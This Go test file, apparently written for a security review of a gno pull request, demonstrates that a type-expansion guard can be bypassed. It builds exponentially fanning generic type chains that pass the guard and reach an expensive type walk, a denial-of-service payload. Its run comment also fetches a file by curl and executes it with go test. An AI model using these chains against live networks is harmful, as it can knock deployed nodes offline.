// NOT AUDITED — AI-generated adversarial test artifact. Verify before executing in any privileged context.

/* Run: from a gno checkout:
gh pr checkout 5826 -R gnolang/gno && git checkout 088ce87
curl -fsSL -o gnovm/pkg/gnolang/zz_generic_fanout_dos_test.go \
  https://raw.githubusercontent.com/samouraiworld/gno-agent-workspace/main/reviews/pr/5xxx/5826-typecheck-fanout-dos/1-088ce87/tests/generic_fanout_dos_test.go
go test -count=1 -run TestGenericFanOutGuardHole -v ./gnovm/pkg/gnolang/
rm gnovm/pkg/gnolang/zz_generic_fanout_dos_test.go
*/

// checkTypeExpansionBound is the gate before go/types' exponential validType walk.
// Its cost() for an *ast.IndexExpr returns cost(t.X), dropping the type argument,
// so a value-doubling chain routed through a generic instantiation (W[A_{n-1}])
// scores as a constant and the guard returns nil. This is the SAME value fan-out
// the PR's own fanOutSrc row rejects, so it reproduces straight at the guard: no
// goroutine, no timeout. At 088ce87 the value chain is rejected and the generic
// chain is accepted, leaving the unmetered AddPackage deploy path exposed.

package gnolang

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"strings"
	"testing"
)

func parseFanout(t *testing.T, src string) (*token.FileSet, []*ast.File) {
	t.Helper()
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, "fanout.go", src, parser.SkipObjectResolution)
	if err != nil {
		t.Fatal(err)
	}
	return fset, []*ast.File{f}
}

// Direct value-doubling chain: each level embeds the previous one twice by value.
func valueFanOutSrc(depth int) string {
	var b strings.Builder
	b.WriteString("package x\ntype T0 struct{ v int }\n")
	for i := 1; i <= depth; i++ {
		fmt.Fprintf(&b, "type T%d struct{ a, b [0]T%d }\n", i, i-1)
	}
	return b.String()
}

// The same doubling routed through a generic: A_n embeds W[A_{n-1}] by value,
// and W holds its type parameter twice, so each level still doubles.
func genericFanOutSrc(depth int) string {
	var b strings.Builder
	b.WriteString("package x\ntype W[P any] struct{ a, b [0]P }\ntype A0 struct{ v int }\n")
	for i := 1; i <= depth; i++ {
		fmt.Fprintf(&b, "type A%d struct{ x W[A%d] }\n", i, i-1)
	}
	return b.String()
}

func TestGenericFanOutGuardHole(t *testing.T) {
	// Baseline the PR fixes: the guard rejects the direct value fan-out.
	fset, gofs := parseFanout(t, valueFanOutSrc(30))
	if err := checkTypeExpansionBound(fset, gofs); err == nil {
		t.Fatal("value fan-out: expected a denial-of-service rejection, got nil")
	}

	// The hole: the identical fan-out through a generic slips past the guard.
	fset, gofs = parseFanout(t, genericFanOutSrc(30))
	if err := checkTypeExpansionBound(fset, gofs); err != nil {
		t.Fatalf("generic fan-out was rejected (%v); the guard hole appears fixed", err)
	}
	t.Fatal("generic fan-out ACCEPTED by the guard: it reaches the exponential validType walk this PR fences off")
}
